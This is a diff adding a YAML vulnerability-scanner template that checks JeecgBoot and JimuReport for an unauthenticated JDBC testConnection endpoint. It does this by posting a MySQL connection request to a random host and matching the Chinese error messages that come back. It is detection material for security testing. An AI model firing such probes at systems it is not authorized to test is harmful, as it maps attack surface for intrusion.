@@ -1,0 +1,48 @@
+name: poc-yaml-jeecg-boot-jdbc-unauth
+manual: true
+transport: http
+set:
+    db: randomLowercase(8)
+    host: randomLowercase(8)
+    port: randomInt(1, 65535)
+rules:
+    jeecgboot:
+        request:
+            cache: true
+            method: POST
+            path: /jeecg-boot/jmreport/testConnection
+            headers:
+                Content-Type: application/json
+            body: |-
+                {
+                  "id":"1",
+                  "code":"dataSource",
+                  "dbType":"MySQL","dbDriver":"com.mysql.cj.jdbc.Driver",
+                  "dbUrl":"jdbc:mysql://{{host}}:{{port}}/{{db}}",
+                  "dbName":"test" ,
+                  "dbUsername" :"test","dbPassword":"test",
+                  "connectTimes":3
+                }
+            follow_redirects: false
+        expression: response.status == 200 && response.headers["Content-Type"].icontains("application/json") && (response.body_string.icontains("数据库连接失败") || response.body_string.icontains("数据源已连接错误3次以上,请检查配置信息！"))
+    jimureport:
+        request:
+            cache: true
+            method: POST
+            path: /jmreport/testConnection
+            headers:
+                Content-Type: application/json
+            body: |-
+                {
+                  "id":"1",
+                  "code":"dataSource",
+                  "dbType":"MySQL","dbDriver":"com.mysql.cj.jdbc.Driver",
+                  "dbUrl":"jdbc:mysql://{{host}}:{{port}}/{{db}}",
+                  "dbName":"test" ,
+                  "dbUsername" :"test","dbPassword":"test",
+                  "connectTimes":3
+                }
+            follow_redirects: false
+        expression: response.status == 200 && response.headers["Content-Type"].icontains("application/json") && (response.body_string.icontains("数据库连接失败") || response.body_string.icontains("数据源已连接错误3次以上,请检查配置信息！"))
+expression: jeecgboot() || jimureport()
+detail: {}
